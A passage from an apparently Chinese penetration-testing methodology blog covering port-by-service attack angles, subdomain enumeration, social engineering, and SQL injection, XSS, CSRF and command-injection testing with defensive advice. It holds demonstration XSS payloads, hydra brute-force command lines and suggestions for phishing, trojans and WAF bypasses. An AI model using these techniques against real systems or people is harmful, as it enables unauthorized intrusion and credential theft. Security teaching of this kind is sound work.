<td>tcp 2601,2604</td>
<td>zebra路由</td>
<td>默认密码zerbra</td>
</tr>
<tr>
<td>tcp 3128</td>
<td>squid代理服务</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3312,3311</td>
<td>kangle主机管理登录</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3306</td>
<td>mysql数据库</td>
<td>注入,提权,爆破</td>
</tr>
<tr>
<td>tcp 3389</td>
<td>windows rdp远程桌面</td>
<td>shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]</td>
</tr>
<tr>
<td>tcp 4848</td>
<td>glassfish控制台</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 4899</td>
<td>radmin远程桌面管理工具,现在已经非常非常少了</td>
<td>抓密码拓展机器</td>
</tr>
<tr>
<td>tcp 5000</td>
<td>sybase/DB2数据库</td>
<td>爆破,注入</td>
</tr>
<tr>
<td>tcp 5432</td>
<td>postgresql数据库</td>
<td>爆破,注入,弱口令</td>
</tr>
<tr>
<td>tcp 5632</td>
<td>pcanywhere远程桌面管理工具</td>
<td>抓密码,代码执行,已经快退出历史舞台了</td>
</tr>
<tr>
<td>tcp 5900,5901,5902</td>
<td>vnc远程桌面管理工具</td>
<td>弱口令爆破,如果信息搜集不到位,成功几率很小</td>
</tr>
<tr>
<td>tcp 5984</td>
<td>CouchDB</td>
<td>未授权导致的任意指令执行</td>
</tr>
<tr>
<td>tcp 6379</td>
<td>redis未授权</td>
<td>可尝试未授权访问,弱口令爆破</td>
</tr>
<tr>
<td>tcp 7001,7002</td>
<td>weblogic控制台</td>
<td>java反序列化,弱口令</td>
</tr>
<tr>
<td>tcp 7778</td>
<td>kloxo</td>
<td>主机面板登录</td>
</tr>
<tr>
<td>tcp 8000</td>
<td>Ajenti主机控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8443</td>
<td>plesk主机控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8069</td>
<td>zabbix</td>
<td>远程执行,sql注入</td>
</tr>
<tr>
<td>tcp 8080-8089</td>
<td>Jenkins,jboss</td>
<td>反序列化,控制台弱口令</td>
</tr>
<tr>
<td>tcp 9080-9081,9090</td>
<td>websphere控制台</td>
<td>java反序列化/弱口令</td>
</tr>
<tr>
<td>tcp 9200,9300</td>
<td>elasticsearch</td>
<td>远程执行</td>
</tr>
<tr>
<td>tcp 10000</td>
<td>webmin linux主机web控制面板入口</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 11211</td>
<td>memcached</td>
<td>未授权访问</td>
</tr>
<tr>
<td>tcp 27017,27018</td>
<td>mongodb</td>
<td>爆破,未授权访问</td>
</tr>
<tr>
<td>tcp 3690</td>
<td>svn服务</td>
<td>svn泄露,未授权访问</td>
</tr>
<tr>
<td>tcp 50000</td>
<td>SAP Management Console</td>
<td>远程执行</td>
</tr>
<tr>
<td>tcp 50070,50030</td>
<td>hadoop</td>
<td>默认端口未授权访问</td>
</tr>
</tbody>
</table>
<ul>
<li><p>子域名信息收集</p>
<p>  在渗透测试的时候，往往主站的防御会很强，常常无从下手，那么子站就是一个重要的突破口，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，因此子域名是渗透测试的主要关注对象，子域名搜集的越完整，那么挖到的漏洞就可能更多，甚至漏洞的级别也会更高。常用工具暴力枚举<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a>、子域名挖掘机Layer、DNS域传送漏洞、https证书日志、DNS解析记录、搜索引擎（baidu/google）、IP反查、主站爬取、shodan/fofa/zoomeye等</p>
<p>  <strong>利用dig检查目标ns服务器是否允许传送</strong></p>
<p>  区域传送：允许第三主服务器的数据刷新自己的区域数据库，防止主域名服务器因意外故障变得不可用时影响到这个网络。 区域传送配置错误：只要有人发出请求，就会提供一个区域数据库的拷贝，把内部主机名和ip地址暴露出来</p>
<p>  首先,应该去查下目标的ns服务器是否允许区域传送,如果允许,直接把目标的整个子域备份过来即可，可以使用 <strong>dig</strong>（可以从该域名的官方DNS服务器上查询到精确的权威解答）或 <strong>nslookup</strong>（得到DNS解析服务器保存在Cache中的非权威解答）</p>
<ul>
<li><p>查出目标自己所有的ns记录,然后挨个尝试目标ns服务器是否允许传送（务必是目标自己的ns服务器,第三方的不算）</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">dig</span> +<span class="selector-tag">short</span> @<span class="keyword">8</span>.<span class="keyword">8</span>.<span class="keyword">8</span>.<span class="keyword">8</span> xx.cn ns</span><br><span class="line">dns.xx.cn.</span><br><span class="line">dns1.xx.cn.</span><br></pre></td></tr></table></figure>
<p>通过上面的查询,我们确定了目标自己的三个ns服务器,下面就开始来尝试逐个传送,这里还是要注意,必须用目标自己的ns服务器来解析它自己的子域</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">dig</span> @<span class="keyword">dns</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; <span class="selector-tag">DiG</span> 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; @<span class="keyword">dns</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line">; (1 <span class="selector-tag">server</span> <span class="selector-tag">found</span>)</span><br><span class="line">;; <span class="selector-tag">global</span> <span class="selector-tag">options</span>: +<span class="selector-tag">cmd</span></span><br><span class="line">; <span class="selector-tag">Transfer</span> <span class="selector-tag">failed</span>.</span><br><span class="line"></span><br><span class="line"># <span class="selector-tag">dig</span> @<span class="keyword">dns1</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; <span class="selector-tag">DiG</span> 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; @<span class="keyword">dns1</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line">; (1 <span class="selector-tag">server</span> <span class="selector-tag">found</span>)</span><br><span class="line">;; <span class="selector-tag">global</span> <span class="selector-tag">options</span>: +<span class="selector-tag">cmd</span></span><br><span class="line">; <span class="selector-tag">Transfer</span> <span class="selector-tag">failed</span>.</span><br></pre></td></tr></table></figure>
<p>很显然,上面的这些ns服务器都不允许传送,如果目标ns服务器实在不允许传送,从其他的各种记录中获取子域,如,mx记录,spf记录,srv记录…</p>
</li>
</ul>
</li>
<li><p>邮件系统信息</p>
<p>  通过域名MX记录查看是否为自建邮件服务器，自建的情况下可以后续测试漏洞，通过TheHarvester可以进行邮箱挖掘，没有找到漏洞也可以进行钓鱼</p>
</li>
<li><p>了解网站业务功能</p>
<p>  我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞，比如：登陆/留言/下单/退出/退货/付款等。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
</li>
<li><p>了解网站目录的结构</p>
<p>  在开始安全测试之前, 了解应用程序的结构是至关重要的。如果不彻底了解应用程序的布局, 就不可能对其进行彻底的测试。可以通过burpsuite自动化爬虫，</p>
</li>
<li><p>企业及员工信息收集-社会工程学</p>
<p>  通过天眼查、官方网站等可以查到企业的一些基本信息</p>
<p>  拿着姓名/手机/邮箱等到各网站搜一圈看注册信息</p>
<p>  拿到员工的信息，我们可以尝试使用弱密码进行登录一些内部平台，并且一些员工的邮箱的前缀很可能就是他的密码。当然，如果说当一个服务不允许多次使用错误密码登录，我们可以先确定弱口令，然后爆破收集到的账号信息去爆破哪些用户使用这个弱口令从而绕过这个防护机制。</p>
<p>  可以尝试给对方邮箱发送钓鱼邮件或木马</p>
<p>  UitraISO+Hacksaw制作木马启动盘</p>
<p>  Airmom-ng假冒ap，并利用karma架设假冒服务</p>
<p>  水坑攻击或鱼叉式钓鱼</p>
</li>
<li><p>网站备案信息</p>
<p>  <a href="http://www.beianbeian.com/?jdfwkey=vv0kk" target="_blank" rel="noopener">www.beianbeian.com/?jdfwkey=vv0kk</a></p>
<p>  <a href="http://www.miitbeian.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://www.miitbeian.gov.cn/publish/query/indexFirst.action</a></p>
</li>
<li><p>F12审查网页元素</p>
<p>  对于程序员来说, 在源代码中添加详细注释和元数据是非常普遍的,甚至是推荐的。但是, HTML 代码中包含的注释和元数据可能会对潜在攻击者暴露内部信息。应对源代码中的注释和元数据进行审查以确定是否泄露了任何信息。</p>
</li>
</ul>
<p>根据已搜集的信息进行梳理与分析，查找疏漏点进行搜集补充，从各个角度都整理一套渗透攻击步骤与思路的规划，优先以最擅长和最有把握的方面切入</p>
<h2 id="0x03-漏洞发现"><a href="#0x03-漏洞发现" class="headerlink" title="0x03 漏洞发现"></a>0x03 漏洞发现</h2><ul>
<li><p>漏洞扫描</p>
<p>  关于漏洞扫描的工具太多了，一般使用awvs/newwus扫描，其他辅助工具 Nmap、msf、searchsploit(exlpoitdb)、burp、firefox插件等</p>
<p>  但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞，需要靠平时的积累学习，且扫描器扫描会插入很多脏数据（数据库/日志等）对网站数据和服务造成破坏。</p>
<p>  拿到环境和不同权限的测试账号后，和业务方沟通业务逻辑，先熟悉一下网站的基本功能和结构，注册/登陆/各个功能模块，从系统漏洞/中间件漏洞/web漏洞</p>
</li>
</ul>
<ul>
<li><p>sql注入</p>
<p>  <strong>定义</strong>：Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。<br><br>  掌握常用的sql注入手法，熟练使用sqlmap或者同类工具。还需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。<br><br>  <strong>其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong>，还需要注意的是如后端语句使用了<code>insert</code>可能一个简单的逻辑判断都能把整个表给篡改了，要注意备份<br><br>  <strong>何防止SQL注入：</strong><br></p>
<ul>
<li>不信任用户的输入；</li>
<li>不使用动态拼接sql，可使用参数化的sql或直接使用存储过程进行数据查询存取；</li>
<li>不使用管理员权限的数据库连接；</li>
<li>对机密信息进行加密或hash掉密码和敏感信息；</li>
<li>应用异常尽可能少在web提示，最好使用自定义信息对应用的异常信息进行包装；</li>
<li><p>采用工具或网络平台检测是否存在SQL注入。</p>
<p><strong>从数据库读取数据</strong></p>
</li>
</ul>
</li>
<li><p>xss漏洞</p>
<p>  <strong>定义</strong>：恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br><br>  前端漏洞也是一个很大的板块，在做渗透测试的时候我们需要抓住一些细微的点，对每一个输出点都尽可能的测试，并且想方设法的去绕过<br></p>
<p>  <strong>用户输入被返回到前端页面</strong></p>
<p>  <strong>XSS可能发生的场景</strong></p>
<ol>
<li><p>在HTML标签中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在这种场景下，XSS的利用方式一般是构造一个&lt;script&gt;标签，或者是任何能够产生脚本执行的方式。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在HTML属性中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">"$var"</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--灵活构造XSS PAYLOAD--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">""</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>&lt;script&gt;</code>标签中输出 </p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x = <span class="string">"$var"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--攻击者需要先闭合引号才能实施XSS攻击--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">""</span>;alert(<span class="regexp">/xss/</span>);<span class="comment">//";</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在事件中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('$var')"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--可能的攻击方法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('');alert(/xss/);  //')"</span>     &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在CSS中输出</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>($&#123;xss&#125;);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>($&#123;xss&#125;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">在<span class="selector-tag">CSS</span>中输出同样存在<span class="selector-tag">XSS</span>的风险，如：</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>(alert(/xss/));&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在地址中输出<br> 6.1 在URL的path（路径）或者search（参数）中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test=$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test="</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>"" &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 防御方法：使用URLEncode</p>
<p> 6.2 整个URL能够被用户控制<br> 这时URL的Protocol和Host部分是不能够使用URLEncode的</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 攻击方法：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1);"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 防御方法：检查变量是否以”http”开头，再对变量进行URLEncode，OWASP中有函数ESAPI.encoder().encoderForURL()，但此API未解决伪协议的问题。</p>
<p><strong>如何防止XSS跨站脚本攻击：（原则是不相信用户输入的数据）</strong><br></p>
</li>
</ol>
<ul>
<li>将重要的cookies标记为http only，这样JavaScript中的document.cookie语句就不能获取到cookie了；</li>
<li>只允许用户输入我们期望的数据，如年龄的textbox中只允许输入数字，其余过滤；</li>
<li>对数据进行Html Encode处理，如&lt;转化为&amp;lt；、&amp;转化为&amp;amp；</li>
<li>过滤或移除特殊的Html标签，如：script、iframe；</li>
<li>过滤JavaScript事件的标签，如“onclick=”、“onfocus”等等。</li>
</ul>
</li>
<li><p>上传漏洞</p>
<p>  各种web中间件解析漏洞，各类编辑器漏洞利用，bypass上传检测（黑名单、白名单配合解析漏洞、阶段、.htaccess自解析、配合本地包含漏洞一起利用</p>
<p>  更多<a href="http://www.pa55w0rd.club/2018/10/19/fileupload/">《文件上传漏洞总结》</a></p>
</li>
<li><p>xxe漏洞</p>
<p>  xxe漏洞如果存在的话危害是非常大的，从读取信息到探测内网等等</p>
</li>
<li><p>逻辑漏洞</p>
<p>  逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等</p>
</li>
<li><p>csrf</p>
<p>  <strong>定义</strong>：是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，也就是说攻击者盗用了你的身份，以你的名义发送恶意请求。<br><br>  攻击者迫使web应用的用户去执行攻击者预设的操作，如果服务器没有合适的防御措施，用户即使访问熟悉的可信网站（生成的poc可以隐藏到论坛/blog等用户生成内容的网站中）也有受到攻击的危险</p>
<p>  攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<p>  因此对于用户来说很难避免在登陆一个网站之后不点击一些链接进行其他操作，所以随时可能成为CSRF的受害者。</p>
<p>  检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户，poc可以通过burpsuite去生成<br></p>
<p>  <strong>功能使用的是请求/响应模式</strong></p>
<p>  如何防止CSRF跨站请求攻击：<br></p>
<ul>
<li>在web站点，将持久化的授权（例如cookie或者http授权）切换为瞬时的授权方法（在每个form中提供隐藏field）；</li>
<li>验证码，强化用户与应用的交互，但每个请求都加验证码，用户友好性体验差，不适合实际使用；</li>
<li>在HTTP头中自定义属性并验证 + One time tokens；</li>
<li>检查请求header中的referer也能帮助组织CSRF攻击，但服务器不是总能拿到referer，有些浏览器出于安全会隐私考虑会不发referer，所以也不常用； </li>
<li>在浏览其它站点前退出登录站点或者浏览结束后清理浏览器cookies；</li>
<li><p>不同的表单包含一个随机的token，在用户提交数据的同时提交这个token，服务器端对比后如果不正确，则拒绝执行操作。<br>  这里是对token的建议如果是已登录的界面给予建议：在前端生成含有 <strong>用户id|当前时间|当前用户ip</strong>可逆的组合加密项(注意是加密不是编码，切忌不要用base64等常见编码当加密措施)，然后后端接收到token然后解密并验证用户ID是否与当前cookie中的用户id一致、用户当前IP是否一致、用户提交的时间与当前时间间隔，如果差距在30分钟以上那么需要用户重新刷新表单提交。</p>
<p>  首先当用户第一次访问页面的时候，服务端可以获取到用户的ID、用户的当前IP、当前用户访问的时间等一些相关信息，利用这些信息组合做一个可逆向的加密，返回给前端，在前端生成一个input  hidden项 name为token，直接放入 value，如果用户执行页面的一些操作Get、Post等请求，会自动带上此值，然后服务端解密此值，然后在与当前获取的同样的数据做判断。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>未授权访问</p>
<p>  这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p>
</li>
<li><p>弱口令</p>
<p>  可以通过爆破的方式发现弱口令，web可以使用burpsuite，服务可以使用hydra</p>
<p>  <strong>hydra简单使用</strong></p>
<p>  项目地址：<a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">https://github.com/vanhauser-thc/thc-hydra</a></p>
<p>  hydra可以运行在Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS</p>
<p>  支持的协议包括：Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p>
  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</span></span><br><span class="line"><span class="ruby">-S 	爆破https时需要加上该选项</span></span><br><span class="line"><span class="ruby">-s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</span></span><br><span class="line"><span class="ruby">-l/-L 	指定用户名 / 指定用户名字典文件</span></span><br><span class="line"><span class="ruby">-p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</span></span><br><span class="line"><span class="ruby">-e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</span></span><br><span class="line"><span class="ruby">-f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个<span class="string">'进程'</span>退出,-F表示全局退出</span></span><br><span class="line"><span class="ruby">-t 	指定爆破进程,实际爆破中给<span class="number">8</span>个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能    无限大,基于目标系统而定,大家酌情使用吧</span></span><br><span class="line"><span class="ruby">-w 	设定超时时长,默认<span class="number">32</span>秒,一般情况<span class="number">10</span>秒即可</span></span><br><span class="line"><span class="ruby">-<span class="number">4</span>/-<span class="number">6</span> 	<span class="number">4</span>表示用ipv4,<span class="number">6</span>表示用ipv6</span></span><br><span class="line"><span class="ruby">-v 	显示爆破信息</span></span><br><span class="line"><span class="ruby">-M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</span></span><br></pre></td></tr></table></figure>
<p>  针对各类服务的实例爆破演示</p>
  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 mysql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 smb:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 ssh:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp:<span class="comment">//192.168.1.2</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>越权访问</p>
<p>  越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面</p>
</li>
<li><p>各种框架漏洞</p>
<p>  比如说structs这个框架的漏洞层出不穷，当明确了目标所使用何种框架之后，我们可以使用poc进行验证</p>
</li>
<li><p>信息泄露</p>
<p>  信息泄露即通过各种搜索手段或者查看robots.txt之类的敏感目录得到敏感信息</p>
</li>
<li><p>文件包含</p>
<p>  当我们在遇到文件上传并且有白名单校验的时候，利用文件包含可以轻松getshell</p>
<p>  远程文件包含拿shell，本地包含读取文件</p>
</li>
<li><p>命令执行</p>
<p>  <strong>定义</strong>：针对操作系统，即能够在服务器上执行任意命令。从Web应用中通过Shell来调用操作系统命令，如果在Shell调用时存在漏洞，就可以执行攻击者的非法OS命令<br><br>  命令注入的思路与sql注入思路是差不多的，都是对用户的输入过滤不严谨。<br></p>
<p>  <strong>调用系统命令</strong></p>
<p>  如何防止OS注入：<br></p>
<ul>
<li>不调用外部程序；</li>
<li>过滤掉、；，[,],|,&lt;,&gt;,\之类的符号；</li>
<li><p>设置用户的权限。</p>
<p>linux命令执行绕过过滤/waf技巧</p>
<p>主要利用了bash的通配符、连接符、未初始化的变量三个特性来绕过WAF规则</p>
</li>
<li><p>通配符<br>  在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p>
  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 <span class="selector-tag">0</span> 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line"><span class="selector-attr">[ ]</span>    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 <span class="selector-attr">[abcd]</span> 代表『一定有一个字符， 可能是 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span>, <span class="selector-tag">d</span> 这四个任何一个』</span><br><span class="line"><span class="selector-attr">[ - ]</span>    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 <span class="selector-attr">[0-9]</span> 代表 <span class="selector-tag">0</span> 到 <span class="selector-tag">9</span> 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line"><span class="selector-attr">[^ ]</span>    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 <span class="selector-attr">[^abc]</span> 代表 一定有一个字符，只要是非 <span 